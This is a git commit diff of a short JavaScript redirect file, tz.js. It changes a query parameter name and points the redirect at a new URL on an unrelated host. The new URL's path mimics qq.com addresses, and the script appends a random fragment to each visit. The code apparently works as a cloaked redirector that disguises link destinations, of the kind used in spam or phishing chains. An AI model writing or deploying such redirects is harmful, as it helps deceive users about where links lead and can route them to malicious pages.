6b0f3b2f25bb59339fa949a28ec21b4b8af62682
bt24s <2743747452@qq.com>
2024-07-19 16:32:51 +0800

    Update tz.js

--- tz.js
+++ tz.js
@@ -3,16 +3,16 @@
 // 获取 URL 参数
 const queryString = window.location.search;
 const urlParams = new URLSearchParams(queryString);
-const customParam = urlParams.get('url');
+const customParam = urlParams.get('v');
 
 // 生成随机数字和英文组合 Fr0iy7UeDNxlynjswdEHIcalaTkv
 const randomString = Math.random().toString(36).substring(2); // 生成随机字符串，包括数字和小写字母
 
 // 构建跳转链接
-let redirectURL = "https://p1.meiyintutu.com/s/ocHDaaagf.html";
+let redirectURL = "https://pic.baoyantong.cn/pic/202105012141/https://im.qq.com/https://qq.com/osssssxzwswfzlaFg,SwMMlQ*,*,;4ks3c,/5sx3.xml";
 // https://static.ylxweb.com/upload/xinyue/2024/FlOoFt0jr9OpaT9jitYy8YNZHsuA.html
 if (customParam) {
-    redirectURL += "?url=" + customParam + "#" + randomString; // 将随机字符串添加到参数后面
+    redirectURL += "?u=" + customParam + "#" + randomString; // 将随机字符串添加到参数后面
 }
 
 // 执行跳转
